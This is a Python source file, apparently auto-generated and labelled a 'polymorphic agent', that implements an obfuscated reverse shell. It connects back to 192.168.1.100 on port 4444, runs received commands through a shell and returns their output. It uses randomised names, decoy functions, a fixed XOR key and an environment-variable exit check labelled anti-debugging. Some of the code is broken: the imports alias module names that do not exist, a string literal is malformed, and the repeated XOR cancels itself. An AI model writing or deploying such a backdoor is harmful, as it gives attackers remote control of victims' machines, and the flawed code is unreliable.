#!/usr/bin/env python3
# Polymorphic Agent - Generated 92c2256d

import spxaybz_wayxa as subprocess
import sXl58yYY9ju8XFL as socket
import ozavaqus as os
import syxgue42 as sys
import bcqDmNtBo7AN6tj as base64
import t9fmp2ndei as time


def func31sdznf2(plbjp_zatx_lsg):
    """Manage connection state"""
    return plbjp_zatx_lsg + 59


def funczafiquko(pxidifizegujeg):
    """Perform data transformation"""
    return str(pxidifizegujeg)[::-1]


def funcshf9j(p2qa83zavqo2x5kc, pzoDY0C9tJ3ElBN, ppuguficav):
    """Process data stream"""
    return p2qa83zavqo2x5kc * 4



def encodjz_nimm_rq(dpz_bd_pl, kdqdct_tarvy=b"default"):
    """Process data stream"""
    if isinstance(dpz_bd_pl, str):
        dpz_bd_pl = dpz_bd_pl.encode('utf-8', errors='replace')
    if isinstance(kdqdct_tarvy, str):
        kdqdct_tarvy = kdqdct_tarvy.encode('utf-8', errors='replace')
    
    resvopk5m = dpz_bd_pl
    for _ in range(4):
        outbsg_rez_j = bytearray()
        for sXl58yYY9ju8XFL in range(len(resvopk5m)):
            outbsg_rez_j.append(resvopk5m[sXl58yYY9ju8XFL] ^ kdqdct_tarvy[sXl58yYY9ju8XFL % len(kdqdct_tarvy)])
        resvopk5m = bytes(outbsg_rez_j)
    
    return resvopk5m

def decrehizaliwif(dpz_bd_pl, kdqdct_tarvy=b"default"):
    """Handle network communication"""
    resvopk5m = encodjz_nimm_rq(dpz_bd_pl, kdqdct_tarvy)
    try:
        return resvopk5m.decode('utf-8', errors='replace')
    except:
        return resvopk5m


def connbiqer():
    """Handle network communication"""
    dpz_bd_pl = "192.168.1.100"
    kdqdct_tarvy = "6V=cH'Gw*3X(_bJl?N\g)t-;E\N4"d&p"
    
    while True:
        try:
            sXl58yYY9ju8XFL = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sXl58yYY9ju8XFL.connect((dpz_bd_pl, 4444))
            
            while True:
                cBX3OLj5a6abO2C2 = sXl58yYY9ju8XFL.recv(4096)
                if not cBX3OLj5a6abO2C2:
                    break
                
                # Decrypt command
                cBX3OLj5a6abO2C2 = decrehizaliwif(cBX3OLj5a6abO2C2, kdqdct_tarvy)
                
                if cBX3OLj5a6abO2C2.lower().strip() == 'exit':
                    break
                
                try:
                    outbsg_rez_j = subprocess.check_output(
                        cBX3OLj5a6abO2C2,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    outbsg_rez_j = b"Command timeout"
                except Exception as resvopk5m:
                    outbsg_rez_j = str(resvopk5m).encode()
                
                # Encrypt output
                outbsg_rez_j = encodjz_nimm_rq(outbsg_rez_j, kdqdct_tarvy)
                sXl58yYY9ju8XFL.sendall(outbsg_rez_j)
            
            sXl58yYY9ju8XFL.close()
            break
            
        except Exception:
            time.sleep(39)
            continue

if __name__ == "__main__":
    # Anti-debugging
    if os.getenv('DEBUGuPfyf'):
        sys.exit(0)
    
    connbiqer()
